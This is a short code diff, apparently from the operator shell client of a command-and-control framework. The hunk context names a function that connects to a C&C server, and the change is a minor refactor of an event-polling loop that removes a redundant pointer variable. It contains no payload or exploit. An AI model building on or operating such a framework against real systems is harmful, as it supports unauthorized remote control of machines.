@@ -254,7 +254,7 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
 }
 
 bool shellC_poll(tShell_client *client, int timeout) {
-    struct sLaika_pollEvent *evnts, *evnt;
+    struct sLaika_pollEvent *evnts;
     int numEvents, i;
 
     /* run any scheduled tasks, this could be moved but it works fine here for now */
@@ -268,8 +268,7 @@ bool shellC_poll(tShell_client *client, int timeout) {
         return false;
 
     for (i = 0; i < numEvents; i++) {
-        evnt = &evnts[i];
-        laikaP_handleEvent(evnt);
+        laikaP_handleEvent(&evnts[i]);
     }
 
     /* flush any events after (eg. made by a packet handler) */
